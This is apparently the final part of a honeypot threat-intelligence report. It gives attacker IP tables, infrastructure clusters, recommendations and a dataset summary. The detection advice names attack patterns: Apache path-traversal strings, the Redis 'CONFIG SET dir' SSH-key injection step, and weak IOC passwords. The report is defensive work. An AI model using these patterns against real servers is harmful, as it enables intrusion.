| 102.218.89.110 | 176 | 10/91 | \-8 | SIL6 AS328939 | 🇺🇬 UG | ISP/business | Compromised grailafrica.com server |
| 172.214.209.153 | 317 | 4/91 | \-10 | Azure AS8075 | 🇺🇸 US | Cloud | SSH campaign initiator; community -10 |
| 81.9.145.130 | 208 | 13/91 | \-5 | Euskaltel AS12338 | 🇪🇸 ES | ISP | SSH actor; 13 det. + 5 suspicious |
| 40.112.183.29 | 235 | 5/91 | \-9 | Azure AS8075 | 🇺🇸 US | Cloud | Human recon actor; community -9 |
| 34.72.208.101 | 171 | 9/91 | \-4 | Google Cloud AS396982 | 🇺🇸 US | Cloud | GCP customer abuse |
| 163.172.46.135 | 214 | 9/91 | 0 | Scaleway AS12876 | 🇫🇷 FR | Cloud | IPTV turned attack node; JARM present |

**Medium Risk** 

| IP | Attacks | VT Det. | ASN | Country | Key Finding |
| --- | --- | --- | --- | --- | --- |
| 138.197.101.205 | 3,849 | 6/91 | DigitalOcean AS14061 | 🇺🇸 US | SSL thehemphouses.com; automated scanner |
| 92.39.134.154 | 3,155 | 0 susp. | WestCall AS9049 | 🇷🇺 RU | NAGTECH self-signed SSL; JARM present |
| 103.182.225.202 | 3,149 | 1/91 | PT iForte AS63859 | 🇮🇩 ID | Community -1; Indonesian ISP |
| 201.187.98.150 | 2,795 | 3/91 | Telefonica Chile AS7303 | 🇨🇱 CL | 3 DNS resolutions |
| 99.208.104.202 | 1,930 | 8/91 | Rogers AS812 | 🇨🇦 CA | Compromised residential; dynamic hostname |
| 190.186.29.213 | 1,564 | 9/91 | COTAS AS25620 | 🇧🇴 BO | JARM present; Bolivian ISP |
| 8.210.133.68 | 1,413 | 2/91 | Alibaba Cloud AS45102 | 🇭🇰 HK | Primary Redis attacker |
| 142.93.183.218 | 1,293 | 3/91 | DigitalOcean AS14061 | 🇺🇸 US | 18 resolutions; 5 certs; recycled VPS |
| 16.58.56.214 | 1,248 | 5/91 | AWS AS16509 | 🇺🇸 US | Clean attack-only node |
| 167.99.250.53 | 1,148 | 7/91 | DigitalOcean AS14061 | 🇩🇪 DE | 16 resolutions; 10 certs |
| 31.70.75.115 | 1,824 | 3/91 | IONOS AS8560 | 🇩🇪 DE | IONOS fleet node 1 |
| 31.70.89.209 | 1,272 | 3/91 | IONOS AS8560 | 🇩🇪 DE | IONOS fleet node 2 |
| 31.70.75.109 | 285 | 3/91 | IONOS AS8560 | 🇩🇪 DE | IONOS fleet node 3 |
| 31.70.75.117 | 284 | 5/91 | IONOS AS8560 | 🇩🇪 DE | IONOS fleet node 4 |
| 31.70.78.114 | 281 | 5/91 | IONOS AS8560 | 🇩🇪 DE | IONOS fleet node 5 |
| 31.70.78.222 | 277 | 6/91 | IONOS AS8560 | 🇩🇪 DE | IONOS fleet node 6 |
| 31.70.75.118 | 275 | 6/91 | IONOS AS8560 | 🇩🇪 DE | IONOS fleet node 7 |
| 31.70.77.205 | 260 | 3/91 | IONOS AS8560 | 🇩🇪 DE | IONOS fleet node 8 |
| 31.70.75.104 | 257 | 5/91 | IONOS AS8560 | 🇩🇪 DE | IONOS fleet node 9 |
| 18.116.101.220 | 1,004 | 5/91 | AWS AS16509 | 🇺🇸 US | JARM present; 5 resolutions |
| 3.129.187.38 | 951 | 5/91 | AWS AS16509 | 🇺🇸 US | Cobalt Strike JARM; 10 resolutions |
| 3.130.168.2 | 677 | 7/91 | AWS AS16509 | 🇺🇸 US | Cobalt Strike JARM; UID API SSL |
| 3.131.220.121 | 621 | 10/91 | AWS AS16509 | 🇺🇸 US | smartsuite.com old tenant; attack node |
| 128.199.5.21 | 1,122 | 1/91 | DigitalOcean AS14061 | 🇸🇬 SG | 20 resolutions; 8 certs; multi-tenanted |
| 189.147.19.238 | 304 | 16/91 | UNINET AS8151 | 🇲🇽 MX | Tagged proxy — laundering attack traffic |
| 174.138.59.240 | 491 | 7/91 | DigitalOcean AS14061 | 🇺🇸 US | cPanel SSL; compromised VPS |
| 3.134.216.108 | 346 | 7/91 | AWS AS16509 | 🇺🇸 US | 13 resolutions; recycled EC2 |
| 3.143.162.210 | 333 | 6/91 | AWS AS16509 | 🇺🇸 US | Distinct JARM; staging API SSL |
| 134.195.101.206 | 712 | 4/91 | Black Mesa Corp | 🇺🇸 US | Self-signed host.gov.win cert — fake gov TLD |
| 165.227.81.10 | 704 | 6/91 | DigitalOcean AS14061 | 🇺🇸 US | Citi self-signed SSL — phishing indicator |
| 161.35.145.126 | 768 | 4/91 | DigitalOcean AS14061 | 🇳🇱 NL | 10 resolutions; 5 certs; VPS attack node |
| 80.172.227.24 | 744 | 6/91 | Claranet Portugal | 🇵🇹 PT | Likely compromised mail/web server |
| 68.183.157.68 | 854 | 1/91 | DigitalOcean AS14061 | 🇺🇸 US | 20 resolutions; 4 certs; shared hosting |
| 206.189.202.200 | 372 | 3/91 | DigitalOcean AS14061 | 🇺🇸 US | 20 certs; 2 linked malware files |
| 51.159.110.167 | 159 | 10/91 | Scaleway AS12876 | 🇫🇷 FR | Second Scaleway attack node |
| 152.52.15.214 | 202 | 5/91 | Airtel AS9498 | 🇮🇳 IN | **Compromised FortiGate firewall** |
| 90.169.216.25 | 176 | 9/91 | Orange Spain AS12479 | 🇪🇸 ES | **Compromised Synology NAS** |
| 79.36.191.212 | 250 | 7/91 | TIM Italy AS3269 | 🇮🇹 IT | Compromised Italian Telecom endpoint |

**Low Risk** 

| IP | Attacks | VT Det. | Country | Notes |
| --- | --- | --- | --- | --- |
| 201.216.239.205 | 5,893 | 1/91 | 🇦🇷 AR | Highest volume; EternalBlue scanner |
| 190.60.60.194 | 2,555 | 0 susp. | 🇨🇴 CO | Clean VT; compromised endpoint |
| 39.152.28.80 | 918 | 8/91 | 🇨🇳 CN | China Mobile; IoT/router compromise |
| 42.54.64.110 | 300 | 1/91 | 🇨🇳 CN | China Unicom residential |
| 42.54.67.129 | 249 | 1/91 | 🇨🇳 CN | China Unicom; twin of .110 — possible IoT cluster |
| 14.145.130.213 | 279 | 0/91 | 🇨🇳 CN | Chinanet; fully clean; compromised endpoint |
| 14.21.56.207 | 165 | 0 susp. | 🇨🇳 CN | Chinanet residential |
| 1.207.150.24 | 440 | 0/91 | 🇨🇳 CN | Chinanet residential; fully undetected |
| 14.218.31.173 | 483 | 0/91 | 🇨🇳 CN | Chinanet residential |
| 223.99.63.19 | 616 | 0 susp. | 🇨🇳 CN | Shandong Mobile; compromised device |
| 203.160.71.157 | 623 | 0 susp. | 🇭🇰 HK | China Unicom HK; nearly clean |
| 205.254.184.151 | 798 | 0 susp. | 🇮🇳 IN | Excitel India broadband |
| 91.231.203.3 | 848 | 2/91 | 🇦🇲 AM | Arpinet Armenia; small ISP |
| 84.103.174.6 | 680 | 2/91 | 🇫🇷 FR | SFR France; ISP subscriber |
| 3.88.176.69 | 605 | 1/91 | 🇺🇸 US | AWS; nearly clean |
| 34.229.239.189 | 606 | 1/91 | 🇺🇸 US | AWS; recycled EC2 |
| 3.89.227.180 | 604 | 1/91 | 🇺🇸 US | AWS; EC2 instance |
| 13.70.196.114 | 577 | 2/91 | 🇮🇪 IE | Azure EU; ns02.cisltd.com self-signed |
| 20.121.66.43 | 521 | 2/91 | 🇺🇸 US | Azure US; cprapid.com cert |
| 187.192.196.89 | 560 | 1/91 | 🇲🇽 MX | UNINET Mexico; compromised subscriber |
| 41.90.209.16 | 160 | 2/91 | 🇰🇪 KE | Safaricom Kenya; 1 linked malware file |
| 100.20.177.21 | 317 | 1/91 | 🇺🇸 US | AWS; generic EC2 |
| 100.31.24.150 | 158 | 2/91 | 🇺🇸 US | AWS; Heroku staging SSL |
| 69.162.65.146 | 163 | 4/91 | 🇺🇸 US | Limestone Networks; 20 resolutions |
| 16.146.132.202 | 163 | 0 susp. | 🇺🇸 US | AWS; clean; new allocation 2022 |
| 16.146.216.124 | 158 | 2/91 | 🇺🇸 US | AWS; twin of .202 |

---

#### 🔗 Notable Clusters Identified Across 100 IPs

**IONOS SE Fleet - 31.70.64.0/18 (9 nodes, 5,015 attacks)** Single actor operating 9 IONOS VPS nodes. Each node has identical detection profile (3–6 malicious, 1–3 suspicious) and exactly 1 DNS resolution — consistent with automated provisioning. All traffic is Suricata-only port scanning. **Block 31.70.64.0/18 entirely.**

| IP | Attacks | VT |
| --- | --- | --- |
| 31.70.75.115 | 1,824 | 3/91 + 2 susp. |
| 31.70.89.209 | 1,272 | 3/91 + 1 susp. |
| 31.70.75.109 | 285 | 3/91 + 2 susp. |
| 31.70.75.117 | 284 | 5/91 + 2 susp. |
| 31.70.78.114 | 281 | 5/91 + 2 susp. |
| 31.70.78.222 | 277 | 6/91 + 3 susp. |
| 31.70.75.104 | 257 | 5/91 + 3 susp. |
| 31.70.75.118 | 275 | 6/91 + 3 susp. |
| 31.70.77.205 | 260 | 3/91 + 1 susp. |

**Alsycon B.V. Bulletproof Cluster - 4 nodes, 1,130 attacks** Four IPs across 160.119.76.0/23 and 185.224.128.0/24 — all Seychelles/Netherlands bulletproof registered. Block both subnets.

**Cobalt Strike JARM Cluster - 4 AWS IPs** 18.218.118.203, 3.132.26.232, 3.130.168.2, and 3.129.187.38 all carry JARM hashes consistent with Cobalt Strike C2 profiles. Three of four also probe ICS protocols. Combined: 2,886 attacks. All should be reported to [aws-abuse@amazon.com](mailto:aws-abuse@amazon.com).

---

## 18\. Recommendations

### 18.1 Immediate / High Priority

1.  **Block bulletproof and confirmed attack CIDRs** — The following CIDR blocks are confirmed single-actor or bulletproof hosting infrastructure and should be blocked at perimeter:
    -   `31.70.64.0/18` — IONOS SE fleet (9 nodes, 5,015 attacks, single actor)
    -   `160.119.76.0/23` — Alsycon bulletproof cluster (3 nodes, 963 attacks)
    -   `185.224.128.0/24` — Alsycon secondary subnet
2.  **Report Cobalt Strike C2 candidates to cloud providers:**
    -   `18.218.118.203`, `3.132.26.232`, `3.130.168.2`, `3.129.187.38` to `aws-abuse@amazon.com`
    -   `40.112.183.29`, `40.78.155.180`, `172.203.149.63` to `cert.microsoft.com`
    -   `34.72.208.101` to `google-cloud-compliance@google.com`
    -   Priority: `18.218.118.203` and `3.132.26.232` - Cobalt Strike JARM + active ICS targeting
3.  **Escalate ICS/SCADA finding** - IP `18.218.118.203` probed Kamstrup smart meter, IEC 104, and Guardian AST (petrol station tank gauge) protocols across 54 days. Combined with a Cobalt Strike JARM fingerprint this is a potential critical infrastructure threat. Escalate beyond standard abuse reporting to relevant national CERT/ICS-CERT channels.
4.  **Search for mdrfckr SSH key** - Audit all internet-exposed production systems for the mdrfckr public key in `~/.ssh/authorized_keys`.
5.  **Rotate credentials matching IOC list** - Any system using passwords from §17.3 (`online@2025`, `git@123`, `root.1234`, `root4321`, `linux`, `12345`) should be treated as potentially compromised and rotated immediately.
6.  **Investigate the three novel Cowrie samples** - Hashes `7aa7aae3…`, `f7a2eec2…`, and `93d7393…` are confirmed absent from VirusTotal. Submit for analysis and consider responsible disclosure. Novel unreported samples from honeypots represent original threat intelligence.

### 18.2 Detection Engineering

5.  **SMBv1 detection rule** — Alert on any internal host using SMBv1 (ET INFO Potentially unsafe SMBv1 protocol signature). SMBv1 should be disabled on all modern systems.
6.  **EternalBlue probe detection** — Deploy Suricata rules for MS17-010 probe patterns (both Generic Flags and MSF-style variants) as high-priority alerts.
7.  **Apache CVE-2021-41773/42013 detection** — Add web application firewall rules for path traversal patterns: `/.%2e/`, `/%2e%2e/`, `/.%2e%2e/` targeting `/cgi-bin/`.
8.  **SSH key injection detection** — Monitor for `authorized_keys` writes combined with `chattr` commands — this two-step pattern is highly specific to the mdrfckr campaign.
9.  **Redis exposure detection** — Alert on any Redis `CONFIG SET dir` commands — this is the standard Redis-to-SSH-key-injection attack primitive.

### 18.3 Hardening

10.  **Disable SMBv1 globally** - MS17-010 / EternalBlue is 9 years old and still the most scanned exploit on the internet. No modern Windows system should have SMBv1 enabled.
11.  **VNC authentication enforcement** - 27,815 VNC events indicates significant interest in port 5900. Ensure all VNC instances require authentication and are not internet-exposed without a VPN.
12.  **Redis bind and auth** — Never expose Redis on a public interface. Bind to `127.0.0.1` only, and always set a strong `requirepass`.
13.  **ADB port 5555** - Disable Android Debug Bridge on any device not in active development. On production environments, ensure port 5555 is firewalled.
14.  **PHP-CGI (CVE-2024-4577)** - If running PHP-CGI on Windows, apply the relevant patch or migrate to PHP-FPM. This is an actively exploited RCE from 2024 still being scanned in 2026.
15.  **Patch Dovecot (CVE-2019-11500)** - The most-triggered CVE in this dataset is from 2019. Any unpatched Dovecot installation is a liability.

---

## 19\. Appendix


### Dataset Summary

| Metric | Value |
| --- | --- |
| Observation period | 21 days |
| Total events (all sourcetypes) | ~3,470,714 |
| Application-layer events (non-Suricata, non-p0f) | ~987,725 |
| Unique external attacker IPs (Suricata) | 20,727 |
| Unique application-layer attacker IPs | 1,395 |
| Honeypot sourcetypes active | 20 |
| **IPs enriched via VirusTotal** | **100** |
| High-risk IPs (≥10% VT malicious or community ≤-5) | 24 / 100 |
| Bulletproof / privacy hosting IPs | 8 / 100 |
| Cobalt Strike JARM matches | 4 IPs (18.218.118.203, 3.132.26.232, 3.130.168.2, 3.129.187.38) |
| Compromised device IPs confirmed | 2 (FortiGate, Synology NAS) |
| Coordinated IONOS fleet nodes | 9 IPs - 31.70.64.0/18 - 5,015 combined attacks |
| Alsycon bulletproof cluster nodes | 4 IPs across 2 subnets - 1,130 combined attacks |
| Proxy node confirmed | 189.147.19.238 - laundering attack traffic |
| ICS/SCADA targeting confirmed | 18.218.118.203 - Kamstrup, IEC 104, Guardian AST |
| Cowrie successful logins | 18 |
| Cowrie total sessions | 3,570 |
| Total malware hashes analysed | 51 (21 Cowrie SHA256 + 8 ADBHoney SHA256 + 22 Dionaea MD5) |
| Confirmed malicious (VirusTotal) | 45 / 51 (88.2%) |
| Benign / connection artifacts | 3 / 51 |
| Not in VirusTotal (novel samples) | 3 / 51 |
| Primary malware families | Linux XMRig Miner, Mirai, Gafgyt/Mozi, WannaCry, Android AdbMiner, trojanized sshd |
| Highest-confidence sample | `e15e93db…` - Gafgyt/Mozi ARM (47/62, community -290) |
| Freshest sample | `697e4904…` - ADBHoney ARM ELF, first seen May 25 2026 (4 days before capture) |
| APT-linked YARA hit | `9bcc07ff…` - APT1\_WEBC2\_Y21K (Cowrie) |
| CVEs triggered (Suricata) | 12 distinct CVEs |
| Known-bad IPs (Dshield/Spamhaus/CINS) | 9,067 (43.8% of all Suricata IPs) |
| Confirmed human-operated sessions | 2 IPs (40.112.183.29, 81.9.145.130) |
| Coordinated SSH actor pairs | 1 confirmed (81.9.145.130 - 197.140.11.157) |
| DoublePulsar campaign source IPs | 15+ identified |
| Top targeted port | 445/SMB - 95,656 Suricata events |
| Highest-volume single actor (coordinated) | IONOS fleet - 5,015 combined attacks across 9 nodes |
| Highest IP community score | 46.151.178.13 - community -50 (Sino Worldwide, NL) |